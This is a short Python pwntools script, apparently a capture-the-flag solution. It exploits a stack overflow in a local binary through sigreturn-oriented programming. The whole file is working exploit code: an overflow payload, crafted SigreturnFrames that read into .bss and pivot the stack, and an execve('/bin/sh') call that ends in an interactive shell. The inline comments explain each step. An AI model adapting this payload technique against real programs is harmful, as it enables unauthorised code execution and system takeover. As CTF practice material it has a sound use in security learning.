from pwn import *

p = process('./some-really-ordinary-program')
#p = remote("challenge.nahamcon.com", 32119)

data = 0x402000 + 0x1f4 # added 0x1f4 to avoid going out of bounds stack in main, note main does sub esp, 0x1f4
main = 0x401022
syscall_ret = 0x40101f

# frame to call execve
frame2 = SigreturnFrame(arch="amd64", kernel="amd64") # CREATING A SIGRETURN FRAME
frame2.rax = 59
frame2.rdi = data # rdi = binsh_ptr
frame2.rsi = 0 
frame2.rdx = 0
frame2.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS

pay2 = b"/bin/sh\0" + p64(main) + p64(syscall_ret) + bytes(frame2) # this is a payload to setup the stack using read

#create a frame to read into .bss
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0 # rax = 0, read
frame.rdi = 0 # rdi = fd = 0 = stdin
frame.rsi = data # rsi = buff
frame.rdx = len(pay2) # rdx = count
frame.rsp = data + 8  # pivot stack to constant .bss/data segment
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESs

pay = b"A" * 0x1f4 + b'B' * 8 + p64(main) + p64(syscall_ret) + bytes(frame)

#print (pay, bytes(frame))

# sigreturn eax=15

raw_input('check')
p.sendafter("get.", pay)
p.sendafter("get.", "X"*15) # 15 characters to controll rax, return of read = count of bytes it read (hence we will be setting up rax=15 after this
#p.sendline("A" * 14)
p.sendafter("X" * 15, pay2)
p.sendafter("get.", "Y" * 15)
p.interactive()
